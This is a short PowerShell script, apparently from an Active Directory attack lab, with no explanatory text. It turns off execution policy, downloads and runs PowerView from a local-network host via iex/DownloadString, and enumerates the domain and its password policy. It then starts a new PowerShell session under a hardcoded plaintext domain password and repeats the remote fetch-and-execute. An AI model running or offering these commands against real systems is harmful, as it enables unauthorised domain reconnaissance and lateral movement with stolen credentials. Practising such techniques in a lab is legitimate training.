Set-ExecutionPolicy -Scope CurrentUser Unrestricted -Force

iex (New-Object Net.WebClient).DownloadString("http://192.168.56.5:8001/PowerView.ps1")

Get-NetDomain

(Get-DomainPolicy).systemaccess

$username= "sevenkingdoms.local\robert.baratheon"
$password= ConvertTo-SecureString "iamthekingoftheworld" -AsPlainText -Force

$credential = New-Object System.Management.Automation.PSCredential($username,$password)

Start-Process powershell.exe -Credential $credential -ArgumentList "-NoExit", "-Command",
"iex (New-Object Net.WebClient).DownloadString('http://192.168.56.5:8001/PowerView.ps1');whoami; (get-domainpolicy).systemaccess"
